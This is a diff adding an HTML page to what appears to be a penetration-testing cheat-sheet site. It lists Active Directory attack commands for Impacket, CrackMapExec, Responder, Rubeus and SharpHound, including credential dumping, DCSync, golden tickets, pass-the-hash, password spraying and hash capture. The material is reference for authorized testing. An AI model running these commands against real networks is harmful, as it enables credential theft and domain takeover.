@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
+<link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
+<title>Active Directory Attacks – Hacking Tools</title>
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css">
+
+</head>
+
+<body class="theme-standard" data-page-key="tools-ad">
+<div class="wallpaper"></div>
+
+<div class="tool-section-nav"><a href="../index.html?page=dashboard" target="_top">&larr; Back to Dashboard</a></div>
+
+<h1 class="category-title">Active Directory Attacks</h1>
+
+<div class="grid">
+  <div class="modal" style="margin: 0 auto 3rem; max-width: 1000px; cursor: default;">
+    <table>
+      <tr><th>Tool</th><th>Description</th></tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-impacket')">
+        <td>Impacket</td><td>Python tools for AD and protocol abuse</td>
+      </tr>
+      <tr id="cmd-impacket" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[PsExec] — psexec.py domain/user:pass@&lt;IP&gt;</div>
+    <div>[WMIExec] — wmiexec.py domain/user:pass@&lt;IP&gt;</div>
+    <div>[SMBExec] — smbexec.py domain/user:pass@&lt;IP&gt;</div>
+    <div>[Secrets dump] — secretsdump.py domain/user:pass@&lt;IP&gt;</div>
+
+    <div class="comment-line">---- Kerberos -----</div>
+    <div>[Kerberoast] — GetUserSPNs.py domain/user:pass -dc-ip &lt;IP&gt; -request</div>
+    <div>[AS-REP roast] — GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip &lt;IP&gt;</div>
+    <div>[Request TGT] — getTGT.py domain/user:pass -dc-ip &lt;IP&gt;</div>
+    <div>[Golden ticket] — ticketer.py -nthash &lt;HASH&gt; -domain-sid &lt;SID&gt; -domain domain user</div>
+
+    <div class="comment-line">---- Access & Loot -----</div>
+    <div>[SMB client] — smbclient.py domain/user:pass@&lt;IP&gt;</div>
+    <div>[MSSQL client] — mssqlclient.py domain/user:pass@&lt;IP&gt; -windows-auth</div>
+    <div>[NTLM relay] — ntlmrelayx.py -tf targets.txt -smb2support</div>
+    <div>[Dump NTDS (DCSync)] — secretsdump.py -just-dc domain/user:pass@&lt;IP&gt;</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-cme')">
+        <td>CrackMapExec</td><td>Spray creds, move laterally, enumerate AD</td>
+      </tr>
+      <tr id="cmd-cme" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Auth check] — crackmapexec smb &lt;IP&gt; -u user -p password</div>
+    <div>[Spray creds] — crackmapexec smb &lt;IP&gt; -u users.txt -p passwords.txt</div>
+    <div>[Local auth] — crackmapexec smb &lt;IP&gt; -u user -p password --local-auth</div>
+    <div>[Pass the hash] — crackmapexec smb &lt;IP&gt; -u user -H &lt;HASH&gt;</div>
+
+    <div class="comment-line">---- Enumeration -----</div>
+    <div>[Shares] — crackmapexec smb &lt;IP&gt; -u user -p password --shares</div>
+    <div>[Users] — crackmapexec smb &lt;IP&gt; -u user -p password --users</div>
+    <div>[Groups] — crackmapexec smb &lt;IP&gt; -u user -p password --groups</div>
+    <div>[Sessions] — crackmapexec smb &lt;IP&gt; -u user -p password --sessions</div>
+    <div>[Logged-on users] — crackmapexec smb &lt;IP&gt; -u user -p password --loggedon-users</div>
+
+    <div class="comment-line">---- Execution -----</div>
+    <div>[Run command] — crackmapexec smb &lt;IP&gt; -u user -p password -x whoami</div>
+    <div>[Run PowerShell] — crackmapexec smb &lt;IP&gt; -u user -p password -X "whoami"</div>
+    <div>[Mimikatz module] — crackmapexec smb &lt;IP&gt; -u user -p password -M mimikatz</div>
+
+    <div class="comment-line">---- Scope -----</div>
+    <div>[Scan subnet] — crackmapexec smb 192.168.1.0/24 -u user -p password</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-responder')">
+        <td>Responder</td><td>Poison LLMNR/NBT-NS to capture hashes</td>
+      </tr>
+      <tr id="cmd-responder" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Standard listen] — sudo responder -I eth0</div>
+    <div>[Analyze mode (passive)] — sudo responder -I eth0 -A</div>
+
+    <div class="comment-line">---- Options -----</div>
+    <div>[Force WPAD auth] — sudo responder -I eth0 -w</div>
+    <div>[Log to file] — sudo responder -I eth0 -wf</div>
+    <div>[Disable ESS] — sudo responder -I eth0 --disable-ess</div>
+
+    <div class="comment-line">---- Related -----</div>
+    <div>[NTLM relay captured hashes] — ntlmrelayx.py -tf targets.txt -smb2support</div>
+    <div>[Crack captured hash] — hashcat -m 5600 hashes.txt &lt;wordlist&gt;</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-rubeus')">
+        <td>Rubeus</td><td>Kerberos ticket attacks (roasting, etc.)</td>
+      </tr>
+      <tr id="cmd-rubeus" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Kerberoast] — Rubeus.exe kerberoast /outfile:hashes.txt</div>
+    <div>[AS-REP roast] — Rubeus.exe asreproast /outfile:hashes.txt</div>
+
+    <div class="comment-line">---- Tickets -----</div>
+    <div>[Ask TGT] — Rubeus.exe asktgt /user:user /password:pass /domain:domain</div>
+    <div>[Pass the ticket] — Rubeus.exe ptt /ticket:&lt;BASE64&gt;</div>
+    <div>[Renew ticket] — Rubeus.exe renew /ticket:&lt;BASE64&gt;</div>
+    <div>[Dump tickets] — Rubeus.exe dump</div>
+
+    <div class="comment-line">---- Brute / Spray -----</div>
+    <div>[Password spray] — Rubeus.exe brute /password:Summer2024 /outfile:hashes.txt</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-sharphound')">
+        <td>SharpHound</td><td>Collect AD data for BloodHound</td>
+      </tr>
+      <tr id="cmd-sharphound" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Collect all] — SharpHound.exe -c All</div>
+    <div>[DC only (stealthy)] — SharpHound.exe -c DCOnly</div>
+
+    <div class="comment-line">---- Collection methods -----</div>
+    <div>[Sessions] — SharpHound.exe -c Session</div>
+    <div>[Logged-on users] — SharpHound.exe -c LoggedOn</div>
+    <div>[ACLs] — SharpHound.exe -c ACL</div>
+    <div>[Trusts] — SharpHound.exe -c Trusts</div>
+
+    <div class="comment-line">---- Output -----</div>
+    <div>[Custom output dir] — SharpHound.exe -c All --outputdirectory C:\temp</div>
+    <div>[Custom zip name] — SharpHound.exe -c All --zipfilename loot.zip</div>
+
+  </td>
+</tr>
+    </table>
+  </div>
+</div>
+
+<script>
+  const embedded = window.self !== window.top;
+
+  // Tell the hub's modal our real content height. Called synchronously on
+  // the one interaction that changes it (toggling a command row) so there's
+  // no dependency on observer/timer scheduling; ResizeObserver below is
+  // just a fallback for anything else (initial layout, font swaps, etc).
+  function reportHeight() {
+    if (embedded) {
+      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
+    }
+  }
+
+  function toggleCmd(id) {
+    const row = document.getElementById(id);
+    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
+    reportHeight();
+  }
+
+  (function() {
+    const savedTheme = localStorage.getItem("/settings.html") || "standard";
+    document.body.classList.add("theme-" + savedTheme);
+    if (embedded) document.body.classList.add("embedded");
+  })();
+
+  if (embedded) {
+    new ResizeObserver(reportHeight).observe(document.body);
+    window.addEventListener("load", reportHeight);
+  }
+</script>
+
+<script src="../config/tools/ad.js"></script>
+<script src="../assets/script/wallpaper-loader.js"></script>
+<script src="../assets/script/theme-accent.js"></script>
+<script src="../assets/script/copy-commands.js"></script>
+<script src="../assets/script/page-effects.js"></script>
+<script src="../assets/script/page-effects-loader.js"></script>
+<script>
+  applyWallpaper(toolsAdConfig.background, "tools-ad");
+</script>
+
+</body>
+</html>
